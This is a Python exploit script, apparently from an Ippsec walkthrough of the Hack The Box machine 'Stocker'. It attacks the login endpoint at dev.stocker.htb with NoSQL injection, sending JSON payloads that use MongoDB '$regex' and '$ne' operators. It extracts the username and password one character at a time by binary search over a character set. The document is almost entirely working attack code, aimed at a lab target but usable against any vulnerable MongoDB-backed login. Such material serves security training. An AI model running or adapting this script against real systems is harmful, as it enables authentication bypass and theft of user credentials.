#!/usr/bin/env python3
# The creation of this script was done in: https://www.youtube.com/watch?v=6mkZy8vZ82M
# Author: Ippsec

import requests
import string

def test_login(payload):    
    url = 'http://dev.stocker.htb/login'
    r = requests.post(url, json=payload)
    r.raise_for_status()
    if "error" in r.text:
        return False
    return True      

def get_char_password(username, startswith, charset = string.ascii_letters + string.digits):
    while len(charset) > 1:
        # Get the first half of the current charset
        guess = charset[:len(charset)//2]
        guess = "[" + guess + "]"
        payload = {
            "username":username,
            "password":{ "$regex":f"^{startswith}{guess}" }}
        if test_login(payload):
            # Character is in first half
            charset = charset[:len(charset)//2]
        else:
            # Character is possibly in second half
            charset = charset[len(charset)//2:]
            if len(charset) == 1:
                # Last possibe character, need to check it one last time
                payload = {
                    "username":username,
                    "password":{ "$regex":f"^{startswith}{charset}" }}
                if not test_login(payload):
                    raise Exception("Exhausted Character Set")
    return charset
    #raise Exception("Unable to get char of username")

def get_char_username(startswith, charset = string.ascii_letters + string.digits):
    while len(charset) > 1:
        # Get the first half of the current charset
        guess = charset[:len(charset)//2]
        guess = "[" + guess + "]"
        payload = {
            "username":{ "$regex":f"^{startswith}{guess}" },
            "password":{"$ne":"admin"}}
        if test_login(payload):
            # Character is in first half
            charset = charset[:len(charset)//2]
        else:
            # Character is possibly in second half
            charset = charset[len(charset)//2:]
            if len(charset) == 1:
                # Last possibe character, need to check it one last time
                payload = {
                    "username":{ "$regex":f"^{startswith}{charset}" },
                    "password":{"$ne":"admin"}}
                if not test_login(payload):
                    raise Exception("Exhausted Character Set")
    return charset


def get_password(username, length, startswith=""):
    try:
        for i in range(0, length):
            char = get_char_password(username, startswith)
            if char:
                startswith += char            
        return startswith
    except Exception as e:
        raise e

def get_username(length, startswith=""):
    try:
        for i in range(0, length):
            char = get_char_username(startswith)
            if char:
                startswith += char            
        return startswith
    except Exception as e:
        raise e

def get_length_username():
    try:
        for i in range(1,50):
            payload = {
                "username":{"$regex":f"^[a-zA-Z0-9]{{{i}}}$"},
                "password":{"$ne":"admin"}}
            if test_login(payload):
                return i
        raise Exception("Unable to get length of username")
    except Exception as e:
        raise e
    
def get_length_password(username):
    try:
        for i in range(1,128):
            payload = {
                "username":username,
                "password":{"$regex":f"^[a-zA-Z0-9]{{{i}}}$"}}
            if test_login(payload):
                return i
        raise Exception("Unable to get length of username")
    except Exception as e:
        raise e

try:
    # Get Username Length
    print("[+] Locating Length of Username")
    length_username = get_length_username()
    print(f"[+] The username is {length_username} characters long")
    # Get the username
    print("[+] Locating Username")
    username = get_username(length_username)
    print(f"[+] The username is {username}")
    
    # Get length of user's password
    print("[+] Locating Length of Password")
    length_password = get_length_password(username)
    print(f"[+] {username} Password is {length_password} characters long")
    
    # Get the Password
    print("[+] Locating Password")
    pw = get_password(username, length_password)
    print(f"[+] {username} Password is {pw}")

except Exception as e:
    print(e)
